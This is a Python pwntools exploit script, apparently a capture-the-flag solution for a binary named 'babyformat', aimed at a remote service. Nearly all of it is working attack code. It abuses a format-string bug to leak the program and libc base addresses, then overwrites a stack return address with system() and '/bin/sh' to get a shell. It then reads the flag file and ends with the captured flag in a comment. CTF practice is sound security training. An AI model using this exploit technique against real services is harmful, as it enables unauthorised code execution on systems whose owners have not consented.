#!/usr/bin/env python

from pwn import *
from struct import *
from binascii import *

import re, base64


__LIBC__ = "./libc.so.6"
__NAME__ = "babyformat"
__REMOTE__ = "104.196.99.62"
__REMOTE_PORT__ = 2222
__GDB__ = """
b *0x56555000+0x93B
c
"""

context.arch = 'amd64'

if __name__ == "__main__":

	log.info("pwning %s"  % __NAME__)


	if args.REMOTE:

		log.info("remote run")
		r = remote(__REMOTE__, __REMOTE_PORT__)

	else:

		log.info("local run")

		if args.GDB:

			if args.GDB == 'attach':

				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})
				log.info("attaching gdb...")
				gdb.attach(r.pid, __GDB__)	

			else:

				r = gdb.debug("./%s" % __NAME__, __GDB__)
		else:

			r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})

	log.info("leak image base...")

	r.sendline("%1$x-%6$x+")
	r.recvline()

	data = r.recvuntil("+")
	log.debug("rcvd data: %s" % data)
	m = re.search("(.*?)-(.*?)\+", data, re.M)
	log.debug("Leaks: %s %s" % (m.group(1), m.group(2)))
	
	imageBase = int(m.group(1), 16) - 0x202C
	countOnStack = int(m.group(2), 16) - 12+3

	log.info("image base = 0x%x" % imageBase)
	log.info("COUNT var on stack = 0x%x" % countOnStack)
	
	r.sendline("%" + "%dc" % (countOnStack & 0xffff) +"%9$hn")
	r.recvline()

	log.info("writing 0xff...")
	
	
	r.sendline("%255c%57$hhn")
	r.recvline()

	log.info("leak libc...")

	# #0xffffde3c
	
	r.sendline("_%15$x__")
	
	d = r.recvuntil('__')
	log.debug("recvd: %s" % d)
	m = re.search('_(.*?)_', d, re.M).group(1).strip()
	libcLeak = int(m, 16)
	libcBase = libcLeak - 0x18e81
	log.info("libc leak = 0x%x" % libcLeak)
	log.info("libc image base = 0x%x" % libcBase)


	libc = ELF(__LIBC__)
	libc.address = libcBase

	retOnStack = countOnStack - 3 + 4*8

	#raw_input()

	def writeToStack(addr, dword):

		log.info("wrinting 0x%x -> 0x%x" % (addr, dword))

		for i in range(0, 4):

			r.sendline("%" + "%d" % (addr & 0xff) +"c%9$hhn")
			r.recvline()
			addr += 1
			r.sendline("%" + "%d" % (((0xff << 8*i) & dword) >> 8*i) + "c%57$hhn")	
			r.recvline()

	# leak libc

	# writeToStack(retOnStack, imageBase+0x8ED)
	# writeToStack(retOnStack+4, imageBase+0x8ED+1)
	
	# r.recvuntil("EXIT\n")
	# putsAddr = unpack("<I", r.recvn(4))[0]

	# log.info("puts() %x imagebase %x" % (putsAddr, imageBase+0x8ED+5))

	# log.info("puts() = 0x%x" % (putsAddr+imageBase+0x8ED+5))

	# ./find puts 0xf7d7a360
	# http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6-i386_2.27-3ubuntu1_amd64.deb (id libc6-i386_2.27-3ubuntu1_amd64)

	writeToStack(retOnStack, libc.symbols['system'])
	writeToStack(retOnStack+4*2, next(libc.search('/bin/sh')))
	
	r.sendline("EXIT")
	sleep(1)
	r.sendline("cat /home/babyformat/flag")
	r.interactive()

	# ISITDTU{044b7e07f7da9990e7f2dc1ab28f9b07}
